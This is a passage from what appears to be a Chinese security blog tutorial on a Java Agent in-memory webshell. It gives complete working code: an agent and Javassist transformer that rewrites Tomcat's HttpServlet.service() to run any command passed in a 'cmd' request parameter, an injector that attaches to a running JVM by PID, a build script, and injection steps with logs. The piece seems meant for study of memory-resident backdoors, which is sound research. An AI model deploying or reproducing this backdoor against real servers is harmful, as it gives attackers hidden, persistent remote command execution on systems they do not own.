参数，即可执行命令。</li></ol><h4 id="可用-Demo："><a href="#可用-Demo：" class="headerlink" title="可用 Demo："></a>可用 Demo：</h4><h5 id="目录结构：-1"><a href="#目录结构：-1" class="headerlink" title="目录结构："></a>目录结构：</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524589.png" alt="img"></p><h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br> xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>&lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br><br>&lt;groupId&gt;com.src&lt;/groupId&gt;<br>&lt;artifactId&gt;Demo01&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br>&lt;packaging&gt;jar&lt;/packaging&gt;<br><br>&lt;properties&gt;<br>&lt;project.build.sourceEncoding&gt;UTF-<span class="hljs-number">8</span>&lt;/project.build.sourceEncoding&gt;<br>&lt;maven.compiler.source&gt;<span class="hljs-number">1.8</span>&lt;/maven.compiler.source&gt;<br>&lt;maven.compiler.target&gt;<span class="hljs-number">1.8</span>&lt;/maven.compiler.target&gt;<br>&lt;/properties&gt;<br>&lt;build&gt;<br>&lt;plugins&gt;<br>&lt;!-- 编译插件 --&gt;<br>&lt;plugin&gt;<br>&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;<br>&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">3.8</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>&lt;configuration&gt;<br>&lt;source&gt;<span class="hljs-number">1.8</span>&lt;/source&gt;<br>&lt;target&gt;<span class="hljs-number">1.8</span>&lt;/target&gt;<br>&lt;encoding&gt;UTF-<span class="hljs-number">8</span>&lt;/encoding&gt;<br>&lt;/configuration&gt;<br>&lt;/plugin&gt;<br><br>&lt;!-- 打包 JAR 插件 --&gt;<br>&lt;plugin&gt;<br>&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;<br>&lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.2</span>&lt;/version&gt;<br>&lt;configuration&gt;<br>&lt;archive&gt;<br>&lt;!-- 确保生成标准 MANIFEST 文件 --&gt;<br>&lt;manifest&gt;<br>&lt;addClasspath&gt;<span class="hljs-literal">true</span>&lt;/addClasspath&gt;<br>&lt;useUniqueVersions&gt;<span class="hljs-literal">false</span>&lt;/useUniqueVersions&gt;<br>&lt;/manifest&gt;<br><br>&lt;!-- 这里写入 Agent 属性 --&gt;<br>&lt;manifestEntries&gt;<br>&lt;Agent-Class&gt;com.src.agent.AgentMain&lt;/Agent-Class&gt;<br>&lt;Can-Redefine-Classes&gt;<span class="hljs-literal">true</span>&lt;/Can-Redefine-Classes&gt;<br>&lt;Can-Retransform-Classes&gt;<span class="hljs-literal">true</span>&lt;/Can-Retransform-Classes&gt;<br>&lt;/manifestEntries&gt;<br>&lt;/archive&gt;<br>&lt;/configuration&gt;<br>&lt;/plugin&gt;<br>&lt;/plugins&gt;<br>&lt;/build&gt;<br><br><br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><h5 id="AgentMemShell-java"><a href="#AgentMemShell-java" class="headerlink" title="AgentMemShell.java"></a>AgentMemShell.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentMemShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;AgentMemShell Injected!&quot;</span>);<br><br>        <span class="hljs-comment">// 添加类转换器</span><br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletTransformer</span>(), <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// 找到所有已加载的 HttpServlet 类并进行重转换</span><br>        Class[] loadedClasses = inst.getAllLoadedClasses();<br>        <span class="hljs-keyword">for</span> (Class clazz : loadedClasses) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getName().equals(<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Found HttpServlet:&quot;</span>+clazz);<br>                    inst.retransformClasses(clazz);<br>                    System.out.println(<span class="hljs-string">&quot;Retransform HttpServlet Success.&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        agentmain(agentArgs, inst);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ServletTransformer-java"><a href="#ServletTransformer-java" class="headerlink" title="ServletTransformer.java"></a>ServletTransformer.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javassist.LoaderClassPath;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader,<br>                            String className,<br>                            Class&lt;?&gt; classBeingRedefined,<br>                            ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 打印所有被加载的类，便于调试（仅第一次注入时启用）</span><br>            <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span> &amp;&amp; className.contains(<span class="hljs-string">&quot;servlet&quot;</span>)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[Debug] Loading class: &quot;</span> + className);<br>            &#125;<br><br>            <span class="hljs-comment">// className 可能是 &quot;javax/servlet/http/HttpServlet&quot;</span><br>            <span class="hljs-comment">// 也可能是 &quot;javax.servlet.http.HttpServlet&quot;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">dotName</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><br>            <span class="hljs-comment">// 精确匹配 HttpServlet 类</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>.equals(dotName)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[+] Found target class: &quot;</span> + dotName);<br>                System.out.println(<span class="hljs-string">&quot;[+] Start transforming HttpServlet...&quot;</span>);<br><br>                <span class="hljs-comment">// 初始化 Javassist ClassPool 并添加当前 ClassLoader 的路径</span><br>                <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>                <span class="hljs-keyword">if</span> (loader != <span class="hljs-literal">null</span>) &#123;<br>                    classPool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoaderClassPath</span>(loader));<br>                &#125;<br><br>                <span class="hljs-comment">// 获取类定义</span><br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(dotName);<br>                <span class="hljs-type">CtMethod</span> <span class="hljs-variable">serviceMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;service&quot;</span>);<br><br>                <span class="hljs-comment">// 恶意逻辑</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>                        + <span class="hljs-string">&quot;&#123;&quot;</span><br>                        + <span class="hljs-string">&quot;    javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest)$1;&quot;</span><br>                        + <span class="hljs-string">&quot;    javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse)$2;&quot;</span><br>                        + <span class="hljs-string">&quot;    String cmd = req.getParameter(\&quot;cmd\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;    if (cmd != null) &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;        try &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;            java.util.Scanner s = new java.util.Scanner(&quot;</span><br>                        + <span class="hljs-string">&quot;                Runtime.getRuntime().exec(cmd).getInputStream(), \&quot;UTF-8\&quot;&quot;</span><br>                        + <span class="hljs-string">&quot;            ).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;            String output = s.hasNext() ? s.next() : \&quot;\&quot;;&quot;</span><br>                        + <span class="hljs-string">&quot;            res.setContentType(\&quot;text/plain;charset=UTF-8\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;            res.getWriter().write(output);&quot;</span><br>                        + <span class="hljs-string">&quot;            res.getWriter().flush();&quot;</span><br>                        + <span class="hljs-string">&quot;            return;&quot;</span><br>                        + <span class="hljs-string">&quot;        &#125; catch (Exception e) &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;            e.printStackTrace();&quot;</span><br>                        + <span class="hljs-string">&quot;        &#125;&quot;</span><br>                        + <span class="hljs-string">&quot;    &#125;&quot;</span><br>                        + <span class="hljs-string">&quot;&#125;&quot;</span>;<br><br>                <span class="hljs-comment">// 在 service 方法的开头插入</span><br>                serviceMethod.insertBefore(shell);<br><br>                <span class="hljs-type">byte</span>[] newClassBytes = ctClass.toBytecode();<br>                ctClass.detach();<br><br>                System.out.println(<span class="hljs-string">&quot;[+] HttpServlet Transformed Complete.&quot;</span>);<br>                <span class="hljs-keyword">return</span> newClassBytes;<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;[!] Transform failed: &quot;</span> + e);<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-comment">// 返回 null 表示不修改该类</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Injector-java"><a href="#Injector-java" class="headerlink" title="Injector.java"></a>Injector.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.injector;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Injector</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span> (args.length &lt; <span class="hljs-number">2</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Usage: java -jar injector.jar &lt;pid&gt; &lt;agent_jar_path&gt;&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;Available JVM processes:&quot;</span>);<br>            listProcesses();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">String</span> <span class="hljs-variable">agentJarPath</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">1</span>];<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Trying to attach to PID: &quot;</span> + pid);<br>            <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> VirtualMachine.attach(pid);<br>            vm.loadAgent(agentJarPath);<br>            vm.detach();<br>            System.out.println(<span class="hljs-string">&quot;[+] Agent injected successfully!&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;[-] Injection failed: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listProcesses</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            List&lt;VirtualMachineDescriptor&gt; vmList = VirtualMachine.list();<br>            <span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : vmList) &#123;<br>                System.out.println(<span class="hljs-string">&quot;PID: &quot;</span> + vmd.id() + <span class="hljs-string">&quot; - &quot;</span> + vmd.displayName());<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;[-] Failed to list processes: &quot;</span> + e.getMessage());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="MANIFEST-MF"><a href="#MANIFEST-MF" class="headerlink" title="MANIFEST.MF"></a>MANIFEST.MF</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.src.agent.AgentMemShell<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Built-By: maven<br>Created-By: Apache Maven<br>Build-Jdk: 1.8.0_65<br></code></pre></td></tr></table></figure><p>这是 一个小脚本：</p><h5 id="build-bat"><a href="#build-bat" class="headerlink" title="build.bat"></a>build.bat</h5><p>(部分内容根据实际情况自行修改)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">@<span class="hljs-built_in">echo</span> off<br>setlocal<br><br><span class="hljs-built_in">echo</span> Setting up environment...<br><span class="hljs-built_in">set</span> JAVA_HOME=D:\Java\jdk1.8.0_65<br><span class="hljs-built_in">set</span> PATH=%JAVA_HOME%\bin;%PATH%<br><br><span class="hljs-built_in">echo</span> [1/6] Cleaning target directory...<br><span class="hljs-keyword">if</span> exist target <span class="hljs-built_in">rmdir</span> /s /q target<br><span class="hljs-built_in">mkdir</span> target<br><span class="hljs-built_in">mkdir</span> target\classes<br><br><span class="hljs-built_in">echo</span> [2/6] Compiling agent classes...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\javac&quot;</span> -encoding UTF-8 -<span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;lib\javassist.jar&quot;</span> -d target\classes src\main\java\com\src\agent\*.java<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to compile agent classes!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [3/6] Compiling injector class...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\javac&quot;</span> -encoding UTF-8 -<span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;D:\Java\jdk1.8.0_65\lib\tools.jar;target\classes&quot;</span> -d target\classes src\main\java\com\src\injector\*.java<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to compile injector class!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [4/6] Merging javassist into classes...<br><span class="hljs-built_in">pushd</span> target\classes<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> xf ..\..\lib\javassist.jar<br><span class="hljs-built_in">popd</span><br><br><span class="hljs-built_in">echo</span> [5/6] Packaging agent JAR...<br>rem 如果 src\main\resources\META-INF\MANIFEST.MF 存在则使用它<br><span class="hljs-built_in">set</span> MANIFEST_FILE=src\main\resources\META-INF\MANIFEST.MF<br><span class="hljs-keyword">if</span> not exist <span class="hljs-string">&quot;%MANIFEST_FILE%&quot;</span> <span class="hljs-built_in">set</span> MANIFEST_FILE=META-INF\MANIFEST.MF<br><br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> cfm target\Demo01-1.0-SNAPSHOT.jar <span class="hljs-string">&quot;%MANIFEST_FILE%&quot;</span> -C target\classes .<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to package agent JAR!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [6/6] Creating injector JAR...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> cfe target\Injector.jar com.src.injector.Injector -C target\classes .<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to package injector JAR!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> ========================================<br><span class="hljs-built_in">echo</span> Build Successful!<br><span class="hljs-built_in">echo</span> Generated files:<br><span class="hljs-built_in">echo</span>   - target\Demo01-1.0-SNAPSHOT.jar (Agent with embedded javassist)<br><span class="hljs-built_in">echo</span>   - target\Injector.jar (Injector)<br><span class="hljs-built_in">echo</span> ========================================<br><span class="hljs-built_in">echo</span>.<br><br>pause<br></code></pre></td></tr></table></figure><h5 id="执行-build-bat"><a href="#执行-build-bat" class="headerlink" title="执行 build.bat"></a>执行 build.bat</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523243.png" alt="img"></p><h4 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h4><h5 id="启动一个-Tomcat"><a href="#启动一个-Tomcat" class="headerlink" title="启动一个 Tomcat"></a>启动一个 Tomcat</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523492.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524494.png" alt="img"></p><h5 id="Tomcat-进程"><a href="#Tomcat-进程" class="headerlink" title="Tomcat 进程"></a>Tomcat 进程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 查看所有 Java 进程<br>jps -l<br><br># 查看进程详细信息<br>tasklist | findstr &quot;java&quot;<br><br># 或者使用 wmic<br>wmic process where &quot;name=&#x27;java.exe&#x27;&quot; get processid,commandline<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525788.png" alt="img"></p><p>找到进程：<strong>40268 org.apache.catalina.startup.Bootstrap</strong></p><h5 id="测试注入"><a href="#测试注入" class="headerlink" title="测试注入"></a>测试注入</h5><p><strong>使用管理员身份运行！！</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">java <span class="hljs-operator">-</span>cp <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\J</span>ava<span class="hljs-char escape_">\j</span>dk1.8.0_65<span class="hljs-char escape_">\l</span>ib<span class="hljs-char escape_">\t</span>ools.jar;D:<span class="hljs-char escape_">\J</span>avaCode<span class="hljs-char escape_">\内</span>存马<span class="hljs-char escape_">\A</span>gentMem<span class="hljs-char escape_">\D</span>emo01<span class="hljs-char escape_">\t</span>arget<span class="hljs-char escape_">\I</span>njector.jar&quot;</span> com.src.injector.Injector <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-number">40268</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> D:\JavaCode\内存马\AgentMem\Demo01\target\Demo01-<span class="hljs-number">1</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span>SNAPSHOT.jar<br></code></pre></td></tr></table></figure><p>（为了防止一些莫名其妙的错误，使用了绝对路径）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525851.png" alt="img"></p><p>注入成功</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523146.png" alt="img"></p><p>Tomcat 日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs plain">// Agent 已经被成功加载到目标 JVM 中，agentmain() 被调用，注入成功<br>AgentMemShell Injected!<br><br>//对多个已加载（loaded）且继承自 HttpServlet 的类执行了 